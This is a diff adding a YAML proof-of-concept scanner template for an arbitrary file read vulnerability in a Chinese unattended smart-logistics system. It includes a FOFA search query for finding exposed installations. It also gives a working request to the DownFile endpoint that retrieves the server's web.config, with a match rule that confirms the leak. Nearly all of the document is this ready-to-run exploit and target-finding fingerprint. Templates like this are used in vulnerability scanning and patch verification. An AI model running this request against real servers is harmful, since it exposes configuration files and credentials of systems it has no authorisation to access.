@@ -1,0 +1,22 @@
+id: poc-yaml-eosine-downfile-anyfile-read
+info:
+  name: 易思智能物流无人值守系统 DownFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 易思智能物流无人值守系统
+  fofa: body="/api/SingleLogin"
+requests:
+- method: GET
+  path: /PublicInfoManage/Upload/DownFile?filePath=web.config
+  expression: 'status_code == 200 &&
+
+    contains(body,"<configuration>") &&
+
+    contains(body,"<system.web>") &&
+
+    contains(headers,"filename=")
+
+    '
+variables: {}
+transport: http
